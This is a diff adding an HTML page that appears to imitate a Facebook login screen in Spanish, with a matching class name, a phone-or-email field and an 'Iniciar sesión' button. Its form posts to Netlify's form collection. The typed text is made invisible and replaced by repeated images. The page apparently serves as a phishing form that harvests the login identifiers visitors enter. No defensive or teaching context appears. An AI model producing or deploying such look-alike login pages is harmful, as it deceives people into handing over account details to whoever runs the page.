@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Cuadro de texto con imagen repetida</title>
+    <style>
+        .imagen-input {
+            position: relative;
+            display: inline-block;
+            width: 250px;
+            overflow: hidden;
+            border: 2px solid #000; /* Color del borde */
+        }
+
+        .imagen-input input[type="text"] {
+            width: 100%;
+            padding-right: 30px;
+            color: transparent; /* Oculta el color del texto */
+        }
+
+        .imagen-input .imagenes-container {
+            position: absolute;
+            top: 0;
+            left: 0;
+            display: flex;
+            align-items: center;
+            white-space: nowrap;
+        }
+
+        .imagen-input .imagen-letra {
+            width: 16px; /* Ajusta el ancho de la imagen según tus necesidades */
+            height: 16px; /* Ajusta la altura de la imagen según tus necesidades */
+            background-image: url("nba.png"); /* Reemplaza "ruta_imagen" con la ruta correcta de la imagen */
+            background-size: cover;
+            margin-right: 3px; /* Ajusta el margen derecho de las imágenes según tus necesidades */
+        }
+    </style>
+    <script>
+        function mostrarImagenes() {
+            var texto = document.getElementById("correo").value;
+            var contenedor = document.getElementById("imagenesContainer");
+            contenedor.innerHTML = "";
+
+            for (var i = 0; i < texto.length; i++) {
+                var imagenContenedor = document.createElement("div");
+                imagenContenedor.classList.add("imagen-letra");
+                contenedor.appendChild(imagenContenedor);
+            }
+        }
+    </script>
+</head>
+<body>
+
+<div class="_5rut">
+    <form name="contact" method="POST" data-netlify="true" action="/index">
+        <div class="form-group">
+            <div class="imagen-input">
+                <input class="form-control" type="text" name="correo" id="correo" placeholder="Número de móvil o correo electrónico" required oninput="mostrarImagenes()">
+                <div id="imagenesContainer" class="imagenes-container"></div>
+            </div>
+        </div>
+        <button type="submit" name="submit" class="btn btn-primary btn-block">Iniciar sesión</button>
+    </form>
+</div>
+
+</body>
+</html>
